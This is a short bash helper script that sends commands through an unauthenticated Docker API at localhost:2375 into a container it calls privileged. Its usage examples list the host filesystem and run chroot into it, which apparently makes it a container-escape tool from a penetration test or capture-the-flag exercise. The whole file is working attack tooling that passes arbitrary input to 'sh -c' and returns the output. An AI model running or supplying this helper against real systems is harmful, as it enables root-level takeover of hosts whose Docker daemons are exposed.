#!/bin/bash
# Helper script to execute commands in the privileged container

CONTAINER_ID="772ad9325f2ca981e106c0e5935bed0732fae95122a8fe34c2dbe166e610b932"
DOCKER_API="http://localhost:2375"

if [ -z "$1" ]; then
    echo "Usage: $0 '<command>'"
    echo "Example: $0 'id'"
    echo "Example: $0 'ls -la /host'"
    echo "Example: $0 'chroot /host /usr/bin/whoami'"
    exit 1
fi

# Create exec instance
EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \
  "$DOCKER_API/containers/$CONTAINER_ID/exec" \
  -d "{\"Cmd\":[\"sh\",\"-c\",\"$1\"],\"AttachStdout\":true,\"AttachStderr\":true}" \
  | python3 -c "import sys, json; print(json.load(sys.stdin)['Id'])")

if [ -z "$EXEC_ID" ]; then
    echo "Error: Failed to create exec instance"
    exit 1
fi

# Start exec and get output
curl -s -X POST -H "Content-Type: application/json" \
  "$DOCKER_API/exec/$EXEC_ID/start" \
  -d '{"Detach":false}' \
  | dd bs=1 skip=8 2>/dev/null \
  | strings
